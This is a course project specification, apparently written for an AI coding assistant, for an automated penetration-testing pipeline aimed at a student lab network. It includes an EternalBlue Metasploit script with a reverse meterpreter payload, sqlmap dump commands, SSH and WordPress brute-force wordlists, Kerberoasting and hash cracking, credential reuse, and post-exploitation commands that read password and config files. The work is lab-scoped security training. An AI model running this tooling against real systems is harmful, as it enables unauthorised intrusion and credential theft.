# RIS602 Final Project: Topology-Agnostic Automated Penetration Testing Pipeline
## Context

This is a C/C+ level final project for RIS602 Network Penetration Testing at Seneca
Polytechnic. The script is built and run on Kali Linux against the Neutron Enterprise
Lab (SPR500 topology). The lab contains multiple VLANs with Windows and Linux hosts
including an Active Directory domain controller, web servers, file sharing, and
database services.

The instructor requirement is that the script accepts a CIDR as its only input and
produces equivalent results regardless of which subnet the attacker VM is on. No
hardcoded IPs, hostnames, or topology assumptions anywhere in the codebase.

---

## Environment

- OS: Kali Linux
- Python: 3.13.11
- Run as: root (required for raw socket operations in Nmap)

### Required libraries (install before starting)

```bash
pip3 install python-nmap pymysql jinja2 pywinrm --break-system-packages
```

### Already installed

- impacket 0.14.0.dev0
- ldap3 2.9.1
- paramiko 4.0.0

### System tools required

- nmap (confirm: `which nmap`)
- msfconsole (confirm: `which msfconsole`)
- sqlmap (confirm: `which sqlmap`)
- hashcat (confirm: `which hashcat`)

---

## Project Structure

```
autopwn/
├── autopwn.py              # Master orchestrator - entry point
├── modules/
│   ├── discovery.py        # Stage 1: Layered host discovery
│   ├── enrichment.py       # Stage 2: Service fingerprinting + NSE
│   ├── ad_enum.py          # Stage 3: AD enumeration + Kerberoasting
│   ├── planner.py          # Stage 4: Confidence scoring + attack plan
│   ├── exploits/
│   │   ├── smb.py          # MS17-010 via Metasploit resource script
│   │   ├── web.py          # WordPress creds, DVWA sqlmap
│   │   ├── database.py     # MySQL default creds, Redis unauth
│   │   ├── ssh.py          # SSH credential brute-force
│   │   └── winrm.py        # WinRM authentication
│   ├── reuse.py            # Stage 6: Credential reuse engine
│   ├── postex.py           # Stage 7: Post-exploitation enumeration
│   └── report.py           # Stage 8: Jinja2 HTML report generator
├── wordlists/
│   ├── ssh_passwords.txt   # Curated 20-entry SSH wordlist
│   ├── wp_passwords.txt    # Curated 50-entry WordPress wordlist
│   └── dns_names.txt       # Forward DNS brute-force names
├── templates/
│   └── report.html         # Jinja2 report template
└── state/                  # Auto-created: JSON checkpoint files per run
```

---

## Architecture

The pipeline is strictly linear. Each stage reads the previous stage's JSON output
and writes its own. No stage makes assumptions about topology.

```
Input: CIDR (or --auto to detect local subnet)
  Stage 1: discovery.py      -> state/discovery.json
  Stage 2: enrichment.py     -> state/services.json
  Stage 3: ad_enum.py        -> state/ad_findings.json
  Stage 4: planner.py        -> state/attack_plan.json
  Stage 5: exploits/         -> state/exploitation.json
  Stage 6: reuse.py          -> state/lateral.json
  Stage 7: postex.py         -> state/postex.json
  Stage 8: report.py         -> output/report_<timestamp>.html
```

If a run crashes, the pipeline resumes from the last completed checkpoint.
If a state file already exists for a stage, that stage is skipped on resume.

---

## Master Script: autopwn.py

```bash
# Full run
python3 autopwn.py --target 172.16.10.0/24

# Auto-detect local subnet
python3 autopwn.py --auto

# Dry run: show attack plan without executing exploits
python3 autopwn.py --target 172.16.10.0/24 --dry-run

# Resume from checkpoint
python3 autopwn.py --target 172.16.10.0/24 --resume

# Skip specific stages
python3 autopwn.py --target 172.16.10.0/24 --skip-ad --skip-postex
```

---

## Stage 1: discovery.py

### Goal
Find every live host in the CIDR regardless of whether ICMP is blocked.

### Method (four layers, all run)

**Layer 1: ARP sweep**
- Nmap `-PR -sn <cidr>`
- Works only on local subnet, cannot be filtered
- Most reliable method for same-L2 hosts

**Layer 2: Multi-probe TCP/UDP**
- Nmap `-sn -PE -PP -PS22,80,443,445,3389,8080 -PA80,443 -PU53,161 <cidr>`
- Finds hosts blocking ICMP via TCP SYN/ACK and UDP probes
- Works across routed VLANs

**Layer 3: Reverse DNS**
- `socket.gethostbyaddr(ip)` for each discovered IP
- Adds hostnames to fact model

**Layer 4: Forward DNS brute-force**
- Query discovered DNS servers with names from wordlists/dns_names.txt
- Catches hosts that did not respond to any probe but have DNS records

### Output schema: state/discovery.json

```json
{
  "cidr": "172.16.10.0/24",
  "timestamp": "2026-01-01T12:00:00",
  "hosts": [
    {
      "ip": "172.16.10.10",
      "hostname": "dc01.neutron.local",
      "discovery_method": "arp"
    }
  ]
}
```

---

## Stage 2: enrichment.py

### Goal
For each discovered host, identify open ports, service versions, OS, and
app-specific flags that drive exploit path selection.

### Method
- Nmap SYN scan: `-sS -sV -O --version-intensity 7`
- Dynamic NSE script selection based on open ports:

```python
PORT_SCRIPTS = {
    21:   "ftp-anon,ftp-proftpd-backdoor",
    22:   "ssh-auth-methods",
    80:   "http-title,http-enum,http-wordpress-enum,http-headers",
    88:   "krb5-enum-users",
    389:  "ldap-rootdse",
    443:  "http-title,http-enum,http-wordpress-enum,ssl-cert",
    445:  "smb-vuln-ms17-010,smb-os-discovery,smb-security-mode",
    1433: "ms-sql-info,ms-sql-empty-password",
    3306: "mysql-empty-password,mysql-info",
    5985: "http-auth-finder",
    6379: "redis-info",
    161:  "snmp-info",
}
```

### Output schema: state/services.json

```json
{
  "hosts": [
    {
      "ip": "172.16.10.10",
      "hostname": "dc01.neutron.local",
      "os_guess": "Windows Server 2019",
      "ports": [
        {
          "port": 445,
          "protocol": "tcp",
          "state": "open",
          "service": "microsoft-ds",
          "version": "Windows Server 2019",
          "nse_results": {
            "smb-vuln-ms17-010": "VULNERABLE",
            "smb-security-mode": "signing: disabled"
          }
        }
      ],
      "flags": {
        "is_domain_controller": true,
        "has_wordpress": false,
        "has_dvwa": false,
        "ms17_010_vulnerable": false
      }
    }
  ]
}
```

---

## Stage 3: ad_enum.py

### Goal
If any host is flagged as a domain controller (port 88 or 389 open), enumerate
the domain and attempt credential-free attacks.

### Method

**LDAP anonymous bind**
```python
from ldap3 import Server, Connection, ALL, ANONYMOUS
# Attempt anonymous bind on port 389
# Query: (objectClass=user) for all user accounts
# Extract: sAMAccountName, userPrincipalName, memberOf
```

**AS-REP Roasting (no credentials required)**
```python
# Use impacket GetNPUsers.py equivalent
# Find users with DONT_REQ_PREAUTH flag set
# Recover AS-REP hash in hashcat format $krb5asrep$23$...
from impacket.krb5.asn1 import AS_REQ, AS_REP
```

**Kerberoasting (requires valid credentials)**
```python
# Only runs if credentials are available from earlier stages
# Use impacket GetUserSPNs.py equivalent
# Request TGS tickets for service accounts with SPNs
# Recover hash in hashcat format $krb5tgs$23$...
```

**Offline hash cracking**
```python
import subprocess
# hashcat -m 18200 hashes.txt wordlists/ssh_passwords.txt --quiet
# hashcat -m 13100 hashes.txt wordlists/ssh_passwords.txt --quiet
# Parse hashcat output for cracked plaintext
```

### Output schema: state/ad_findings.json

```json
{
  "domain": "neutron.local",
  "dc_ip": "172.16.12.10",
  "users": ["administrator", "jsmith", "svc_backup"],
  "asrep_hashes": ["$krb5asrep$23$jsmith@NEUTRON.LOCAL:..."],
  "kerberoast_hashes": [],
  "cracked_credentials": [
    {"username": "jsmith", "password": "Password123", "domain": "neutron.local"}
  ]
}
```

---

## Stage 4: planner.py

### Goal
Score every potential attack path and produce a ranked, ordered list of
exploit attempts. Nothing fires without being planned here first.

### Confidence scoring rules

Each condition adds to the confidence score for a path.
Only paths reaching HIGH confidence (score >= 3) are executed.
MEDIUM confidence paths (score 1-2) are documented but not executed.

```python
SCORING_RULES = {
    "ms17_010": [
        ("port_445_open", 1),
        ("nse_ms17_010_vulnerable", 2),
        ("os_windows", 1),
        ("smb_signing_disabled", 1),
    ],
    "kerberoast": [
        ("port_88_open", 1),
        ("ldap_enumeration_success", 2),
        ("service_account_with_spn", 1),
    ],
    "wordpress_creds": [
        ("port_80_443_open", 1),
        ("wordpress_fingerprint", 2),
        ("wp_login_accessible", 1),
    ],
    "dvwa_sqli": [
        ("port_80_443_open", 1),
        ("dvwa_fingerprint", 3),
    ],
    "mysql_default": [
        ("port_3306_open", 1),
        ("mysql_empty_password_nse", 3),
    ],
    "redis_unauth": [
        ("port_6379_open", 1),
        ("redis_no_auth_nse", 3),
    ],
    "ssh_brute": [
        ("port_22_open", 1),
        ("ssh_password_auth_allowed", 2),
    ],
    "smb_null": [
        ("port_445_open", 1),
        ("smb_guest_access", 2),
    ],
    "ftp_anon": [
        ("port_21_open", 1),
        ("ftp_anon_nse", 3),
    ],
    "winrm_creds": [
        ("port_5985_open", 1),
        ("credentials_available", 3),
    ],
}
```

### Output schema: state/attack_plan.json

```json
{
  "attack_paths": [
    {
      "host": "172.16.10.10",
      "path": "kerberoast",
      "confidence": "HIGH",
      "score": 4,
      "conditions_met": ["port_88_open", "ldap_enumeration_success", "service_account_with_spn"],
      "priority": 1
    }
  ]
}
```

---

## Stage 5: Exploit Modules

### General rules for all exploit modules

- Every exploit has a hard timeout (45 seconds default, configurable)
- Every exploit returns a standardised result dict:

```python
{
    "success": True/False,
    "host": "172.16.10.10",
    "technique": "ms17_010",
    "evidence": "Meterpreter session 1 opened",
    "credentials_recovered": [],
    "session_type": "meterpreter/shell/none",
    "error": None
}
```

- Stop on first success per host (do not pile on)
- All results written to state/exploitation.json

### exploits/smb.py: MS17-010

```python
def exploit_ms17_010(host, lhost, lport=4444, timeout=45):
    # 1. Generate a Metasploit resource script dynamically
    rc_content = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {host}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
sleep 10
sessions -l
exit
"""
    # 2. Write rc file to /tmp/autopwn_ms17.rc
    # 3. Run: msfconsole -q -r /tmp/autopwn_ms17.rc
    # 4. Parse stdout for "Meterpreter session" to confirm success
    # 5. Return result dict
```

### exploits/web.py: WordPress + DVWA

```python
def exploit_wordpress(host, port=80, timeout=45):
    # 1. Confirm wp-login.php is accessible
    # 2. Load wordlists/wp_passwords.txt
    # 3. POST to wp-login.php with each credential
    # 4. Check response for "Dashboard" or "wp-admin" to confirm login
    # 5. If successful, attempt to read wp-config.php via admin file manager
    # Uses: requests library

def exploit_dvwa(host, port=80, timeout=45):
    # 1. Confirm DVWA login page accessible
    # 2. Login with admin:password (DVWA default)
    # 3. Set security level to low
    # 4. Run sqlmap against DVWA SQLi page:
    #    sqlmap -u "http://{host}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    #           --cookie="PHPSESSID=...; security=low"
    #           --batch --dump --threads=3
    # 5. Parse sqlmap output for successful dump confirmation
```

### exploits/database.py: MySQL + Redis

```python
def exploit_mysql(host, timeout=20):
    # pymysql.connect(host=host, user='root', password='', db='')
    # Try: root/'', root/root, root/mysql, root/toor
    # If success: cursor.execute("SHOW DATABASES") and return results

def exploit_redis(host, port=6379, timeout=10):
    # Raw socket: socket.connect((host, 6379))
    # Send: b"PING\r\n" -> expect +PONG
    # Send: b"CONFIG GET maxmemory\r\n" -> confirms unauth RCE potential
    # Return result dict
```

### exploits/ssh.py: SSH brute-force

```python
def exploit_ssh(host, port=22, timeout=45):
    # Load wordlists/ssh_passwords.txt (20 entries max)
    # For each username/password pair:
    #   paramiko.SSHClient().connect(host, username=u, password=p, timeout=5)
    #   On success: run 'id && hostname' and return output
    #   Break on first success
    # Common usernames to try: root, admin, vagrant, ubuntu, user, sysadmin
```

### exploits/winrm.py: WinRM

```python
def exploit_winrm(host, credentials, timeout=30):
    # credentials comes from credential reuse engine
    # import winrm
    # winrm.Protocol(endpoint=f"http://{host}:5985/wsman", ...)
    # Run: 'whoami /all' and 'ipconfig /all'
    # Return output as evidence
```

---

## Stage 6: reuse.py - Credential Reuse Engine

### Goal
Take every credential recovered in Stages 3 and 5 and test it against
all other relevant services on all discovered hosts.

### Rules
- Maximum 3 reuse attempts per recovered credential to avoid account lockout
- Only test credentials against services that accept that credential type
- Domain credentials: test SMB, WinRM, MSSQL on all Windows hosts
- Local credentials: test SSH on all Linux hosts
- Database credentials: test MySQL/Redis on all database hosts
- All successful reuse events flagged as lateral_movement in the report

### Output schema: state/lateral.json

```json
{
  "reuse_events": [
    {
      "credential": {"username": "jsmith", "password": "Password123"},
      "source_host": "172.16.10.10",
      "target_host": "172.16.10.20",
      "service": "smb",
      "success": true,
      "evidence": "SMB login successful, share enumeration attached"
    }
  ]
}
```

---

## Stage 7: postex.py - Post-Exploitation Enumeration

### Goal
Structured, non-interactive enumeration of any host where a shell was
established. Run commands, collect output, write to fact model. No
interactive sessions during the demo.

### Windows commands to run (via Meterpreter or WinRM)

```
whoami /all
hostname
ipconfig /all
arp -a
net localgroup administrators
net user
systeminfo | findstr /B /C:"OS" /C:"Domain"
wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows"
dir C:\Users\*\Desktop\*.txt 2>nul
dir C:\Users\*\Desktop\*.xlsx 2>nul
```

### Linux commands to run (via SSH)

```
id && whoami
hostname && uname -a
ip addr && ip route
cat /etc/passwd | grep -v nologin
sudo -l 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
find / -name "docker-compose.yml" 2>/dev/null | head -5
crontab -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | head -10
```

### Output schema: state/postex.json

```json
{
  "hosts": [
    {
      "ip": "172.16.10.20",
      "os": "Windows",
      "commands_run": [
        {
          "command": "whoami /all",
          "output": "NT AUTHORITY\\SYSTEM..."
        }
      ],
      "credentials_found": [],
      "files_of_interest": []
    }
  ]
}
```

---

## Stage 8: report.py - HTML Report Generator

### Goal
Read all state/*.json files and generate a single professional HTML report
using Jinja2 + Bootstrap 5 (CDN, no local files needed).

### Report sections

1. Executive Summary
   - Hosts discovered count
   - Services identified count
   - Vulnerabilities confirmed count
   - Exploitation outcomes (success/fail per host)
   - Severity breakdown (Critical/High/Medium/Low)

2. Host Cards (one per discovered host)
   - IP, hostname, OS
   - Open services table
   - Attack paths attempted
   - Exploitation outcome with evidence
   - Post-exploitation findings

3. Lateral Movement Map
   - Simple HTML table showing credential reuse chain
   - Source host -> credential -> target host -> service

4. Attack Timeline
   - Timestamped log of every pipeline action

5. Appendix: Raw Evidence
   - Full command outputs from post-exploitation

### Severity scoring

```python
SEVERITY = {
    "ms17_010":        "Critical",
    "kerberoast":      "Critical",
    "dvwa_sqli":       "High",
    "wordpress_creds": "High",
    "winrm_creds":     "High",
    "mysql_default":   "High",
    "redis_unauth":    "High",
    "ssh_brute":       "Medium",
    "smb_null":        "Medium",
    "ftp_anon":        "Medium",
    "snmp_default":    "Low",
}
```

---

## Wordlists

### wordlists/ssh_passwords.txt (20 entries)
```
password
123456
admin
root
toor
vagrant
changeme
letmein
welcome
Password1
Password123
abc123
qwerty
iloveyou
monkey
dragon
master
shadow
sunshine
superman
```

### wordlists/wp_passwords.txt (50 entries)
Common WordPress defaults plus the above plus:
admin, administrator, wordpress, password, pass, test,
demo, guest, user, login, secret, hunter2, p@ssw0rd,
P@ssw0rd, P@ssword1, Summer2024, Winter2024, Spring2024,
Autumn2024, Company123, Welcome1, Welcome123, (+ more)

### wordlists/dns_names.txt
```
www, mail, ftp, corp, shop, vpn, remote, intranet, portal,
internal, dc, dc01, ad, ldap, files, backup, dev, test,
staging, erp, crm, db, sql, web, app, api, git, jenkins,
tomcat, admin, ns, ns1, ns2, dns, dns1, dns2
```

---

## Important Constraints

1. Run as root. Nmap SYN scanning requires raw socket privileges.
2. msfconsole takes 10-15 seconds to initialise. Account for this in timeouts.
3. sqlmap --batch mode still takes time. Set --timeout=30 --threads=3.
4. hashcat requires a GPU or will be slow on CPU. Use --force on VM if needed.
5. The --dry-run flag must be respected by every exploit module. Check it before
   calling any exploit function.
6. Every subprocess call must have a timeout= parameter. No hanging processes.
7. Write state files atomically (write to .tmp then rename) to avoid corruption
   on crash.

---

## Division of Work

Patrick builds: discovery.py, enrichment.py, planner.py, autopwn.py orchestrator
Abdul builds: ad_enum.py, all exploits/, reuse.py, postex.py, report.py, templates/

Start with your modules. The pipeline runs sequentially so you can develop and
test ad_enum.py and the exploit modules independently by feeding them sample
state/services.json files without needing Patrick's modules complete first.

---

## Sample services.json for testing your modules in isolation

Save this as state/services.json to test your modules before Patrick's stages
are complete:

```json
{
  "hosts": [
    {
      "ip": "172.16.12.10",
      "hostname": "dc.neutron.local",
      "os_guess": "Windows Server 2019",
      "ports": [
        {"port": 88, "protocol": "tcp", "state": "open", "service": "kerberos-sec", "version": "", "nse_results": {}},
        {"port": 389, "protocol": "tcp", "state": "open", "service": "ldap", "version": "", "nse_results": {"ldap-rootdse": "namingContexts: DC=neutron,DC=local"}},
        {"port": 445, "protocol": "tcp", "state": "open", "service": "microsoft-ds", "version": "Windows Server 2019", "nse_results": {"smb-vuln-ms17-010": "NOT VULNERABLE", "smb-security-mode": "signing: required"}}
      ],
      "flags": {"is_domain_controller": true, "has_wordpress": false, "has_dvwa": false, "ms17_010_vulnerable": false}
    },
    {
      "ip": "172.16.12.12",
      "hostname": "files.neutron.local",
      "os_guess": "Linux 4.x",
      "ports": [
        {"port": 80, "protocol": "tcp", "state": "open", "service": "http", "version": "Apache 2.4.41", "nse_results": {"http-title": "Neutron Files", "http-enum": "/"}},
        {"port": 3306, "protocol": "tcp", "state": "open", "service": "mysql", "version": "MySQL 8.0", "nse_results": {"mysql-empty-password": "root account has empty password"}},
        {"port": 6379, "protocol": "tcp", "state": "open", "service": "redis", "version": "Redis 7.0", "nse_results": {"redis-info": "redis_version:7.0.0"}},
        {"port": 2049, "protocol": "tcp", "state": "open", "service": "nfs", "version": "", "nse_results": {}}
      ],
      "flags": {"is_domain_controller": false, "has_wordpress": false, "has_dvwa": false, "ms17_010_vulnerable": false}
    },
    {
      "ip": "172.16.10.36",
      "hostname": "shop.neutron.local",
      "os_guess": "Linux 4.x",
      "ports": [
        {"port": 80, "protocol": "tcp", "state": "open", "service": "http", "version": "nginx 1.18", "nse_results": {"http-title": "Neutron Shop", "http-enum": "/wp-login.php"}},
        {"port": 443, "protocol": "tcp", "state": "open", "service": "https", "version": "nginx 1.18", "nse_results": {"http-title": "Neutron Shop"}}
      ],
      "flags": {"is_domain_controller": false, "has_wordpress": true, "has_dvwa": false, "ms17_010_vulnerable": false}
    },
    {
      "ip": "172.16.10.41",
      "hostname": "jumpbox",
      "os_guess": "Linux 5.x",
      "ports": [
        {"port": 22, "protocol": "tcp", "state": "open", "service": "ssh", "version": "OpenSSH 8.9", "nse_results": {"ssh-auth-methods": "publickey,password"}},
        {"port": 3389, "protocol": "tcp", "state": "open", "service": "ms-wbt-server", "version": "", "nse_results": {}}
      ],
      "flags": {"is_domain_controller": false, "has_wordpress": false, "has_dvwa": false, "ms17_010_vulnerable": false}
    }
  ]
}
```

---

## Lab Environment — Actual Machines

Testing runs directly against the Neutron Enterprise Lab machines (real SPR500 topology).
One pfSense VM replaces the old introuter, borderrouter, and simulated-internet Pi.
Apply netplan configs in `netplan/` to each Linux host before running autopwn.
See `netplan/apply.sh` for per-host instructions.

### pfSense interface map

| pfSense adapter | VirtualBox type     | Interface IP      | Segment  | Hosts served                            |
|-----------------|---------------------|-------------------|----------|-----------------------------------------|
| vtnet0          | NAT                 | DHCP              | WAN      | Internet (replaces Pi)                  |
| vtnet1 (LAN)    | Internal neutron-ext  | 172.16.21.1/26  | External | Kali (.11), VPN User (.20)              |
| vtnet2 (OPT1)   | Internal neutron-dmz  | 172.16.10.33/28 | DMZ      | pubdns (.35), pubdocker (.36), vpn (.40), jumpbox (.41) |
| vtnet3 (OPT2)   | Internal neutron-vlan10 | 172.16.10.1/28  | VLAN10   | Internal Admin/Ansible (DHCP .4–14)     |
| vtnet4 (OPT3)   | Internal neutron-vlan20 | 172.16.10.17/28 | VLAN20   | RootCA (.18), IntCA (.19), Users (DHCP .20–30) |
| vtnet5 (OPT4)   | Internal neutron-vlan30 | 172.16.12.1/27  | VLAN30   | DC (.10), privdns (.11), privdocker (.12) |
| vtnet6 (OPT5)   | Internal neutron-vlan40 | 172.16.12.33/27 | VLAN40   |                                         |

### Host IP reference

| Hostname                        | IP              | Segment  | Role                                    |
|---------------------------------|-----------------|----------|-----------------------------------------|
| dc.neutron.local                | 172.16.12.10    | VLAN30   | Windows Server — AD DS, DHCP            |
| privdns.neutron.local           | 172.16.12.11    | VLAN30   | Ubuntu — internal DNS (Bind9)           |
| files.neutron.local / erp.neutron.local | 172.16.12.12 | VLAN30 | Ubuntu — private Docker (NFS, Odoo)  |
| (Internal Admin / Ansible)      | DHCP .4–.14     | VLAN10   | 172.16.10.0/28                          |
| (RootCA)                        | 172.16.10.18    | VLAN20   | Root Certificate Authority              |
| (IntermediateCA)                | 172.16.10.19    | VLAN20   | Intermediate Certificate Authority      |
| (Internal Users)                | DHCP .20–.30    | VLAN20   | 172.16.10.16/28                         |
| pubdns.neutron.local            | 172.16.10.35    | DMZ      | Ubuntu — public DNS (NXDOMAIN internal) |
| shop.neutron.local / corp.neutron.local | 172.16.10.36 | DMZ  | Ubuntu — public Docker (web)            |
| vpn.neutron.local               | 172.16.10.40    | DMZ      | Ubuntu — OpenVPN server                 |
| (Jumpbox)                       | 172.16.10.41    | DMZ      | Ubuntu — SSH/RDP jump host              |
| (VPN User / external client)    | 172.16.21.20    | External | Ubuntu — OpenVPN client                 |
| (Kali / External Attacker)      | 172.16.21.11    | External | Kali — autopwn.py runs here             |

### Testing individual modules against the lab

```bash
# Test ad_enum.py — point at the live DC (172.16.12.10, reachable after VPN pivot)
python3 -c "
import json, pathlib
data = {'hosts': [{'ip': '172.16.12.10', 'hostname': 'dc.neutron.local',
    'os_guess': 'Windows Server', 'ports': [
        {'port': 88,  'protocol': 'tcp', 'state': 'open', 'service': 'kerberos-sec', 'version': '', 'nse_results': {}},
        {'port': 389, 'protocol': 'tcp', 'state': 'open', 'service': 'ldap', 'version': '', 'nse_results': {}}],
    'flags': {'is_domain_controller': True, 'has_wordpress': False,
              'has_dvwa': False, 'ms17_010_vulnerable': False}}]}
pathlib.Path('state').mkdir(exist_ok=True)
pathlib.Path('state/services.json').write_text(json.dumps(data, indent=2))
"
python3 modules/ad_enum.py

# Test SSH exploit against jumpbox (reachable from external/Kali)
python3 -c "
from modules.exploits.ssh import exploit_ssh
print(exploit_ssh('172.16.10.41'))
"

# Test MySQL against private docker host (172.16.12.12, reachable after VPN)
python3 -c "
from modules.exploits.database import exploit_mysql
print(exploit_mysql('172.16.12.12'))
"

# Test Redis against private docker host (reachable after VPN)
python3 -c "
from modules.exploits.database import exploit_redis
print(exploit_redis('172.16.12.12'))
"

# Test public web against public docker host (reachable from external)
python3 -c "
from modules.exploits.web import exploit_dvwa
print(exploit_dvwa('172.16.10.36'))
"
```

### Recommended test order

1. SSH    (172.16.10.41:22)    — jumpbox, reachable from Kali before VPN
2. Redis  (172.16.12.12:6379)  — private docker, requires VPN pivot first
3. MySQL  (172.16.12.12:3306)  — private docker, requires VPN pivot first
4. Web    (172.16.10.36:80)    — public docker, reachable from Kali before VPN
5. AD enum against dc          — 172.16.12.10, requires VPN pivot, test last

### Connectivity check from Kali (run before autopwn)

```bash
# DMZ hosts — reachable directly from Kali (External)
for ip in 172.16.10.35 172.16.10.36 172.16.10.40 172.16.10.41; do
    ping -c1 -W1 $ip && echo "$ip UP" || echo "$ip DOWN"
done

# VLAN30 hosts — only reachable after VPN pivot to vpn.neutron.local
for ip in 172.16.12.10 172.16.12.11 172.16.12.12; do
    ping -c1 -W1 $ip && echo "$ip UP (VPN active)" || echo "$ip DOWN (need VPN)"
done
```

---

## First Steps in Claude Code

1. Create the directory structure:
   ```bash
   mkdir -p autopwn/modules/exploits autopwn/wordlists autopwn/templates autopwn/state autopwn/output
   ```

2. Install missing Python libraries:
   ```bash
   pip3 install python-nmap pymysql jinja2 pywinrm --break-system-packages
   ```

3. Apply netplan configs to lab machines (from Kali, adjust IPs if needed):
   ```bash
   bash netplan/apply.sh
   ```

4. Verify connectivity from Kali to each lab host:
   ```bash
   # DMZ hosts (reachable directly from Kali on 172.16.21.11)
   for ip in 172.16.10.35 172.16.10.36 172.16.10.40 172.16.10.41; do
       ping -c1 -W1 $ip && echo "$ip UP" || echo "$ip DOWN"
   done
   # VLAN30 hosts (reachable only after VPN pivot via vpn.neutron.local)
   for ip in 172.16.12.10 172.16.12.11 172.16.12.12; do
       ping -c1 -W1 $ip && echo "$ip UP (VPN active)" || echo "$ip DOWN (need VPN)"
   done
   ```

5. Save the sample services.json from this file to autopwn/state/services.json
   (or run Stage 1 discovery to generate it from the live network)

6. Build and test modules one at a time against the live lab machines

7. Wire everything together in autopwn.py last
